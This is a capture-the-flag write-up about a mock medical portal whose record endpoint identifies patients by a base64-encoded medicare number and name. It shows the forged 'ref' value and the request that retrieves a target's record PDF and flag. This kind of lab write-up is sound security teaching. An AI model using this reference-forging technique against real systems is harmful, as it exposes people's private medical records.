---
title: "I See You"
date: 2026-08-16
description: The record endpoint's hashed ref is just base64, letting you pull the high value patient's full record PDF and read the flag inside.
challenge_author: "Kay"
writeup_author: "wallsdeep13"
---

**Challenge:** https://ctf.urisc.club/challenges#I%20see%20you-22

**Goal:** "We have limited access to patient record records. Find a way to read the records of your high value target."

**Flag:**
- `SRCTF!{h4sh3d_r3f_st1ll_l34ks_r3c0rds}` - in the high-value patient's record PDF

---

## Vulnerability

`GET /dashboard/record/?ref=...` looks up a patient record by a `ref` that is just base64 of `medicare + first name + last name`. It's just base64 encoding, not a secret, so it's easy to forge for any patient once you know their medicare number + name (both visible on the patient page from [This Seems Odd](SRCTF-2026/Day-2/this-seems-odd/)).

## Attack Path

### 1. Build the record ref

The record endpoint (`/dashboard/record/?ref=...`) uses the same lookup as the patient page. The `ref` is just base64 of `medicare + first name + last name`:

```
base64("4353462475AnthonyHarrison")
= NDM1MzQ2MjQ3NUFudGhvbnlIYXJyaXNvbg==
```

```
GET /dashboard/record/?ref=NDM1MzQ2MjQ3NUFudGhvbnlIYXJyaXNvbg==
```

### 2. Read the PDF

The returned PDF is Anthony's prescription record, and at the bottom:

```
CONFIDENTIAL: SRCTF!{h4sh3d_r3f_st1ll_l34ks_r3c0rds}
Strictly confidential. Property of AussieMed.
```

---

## Notes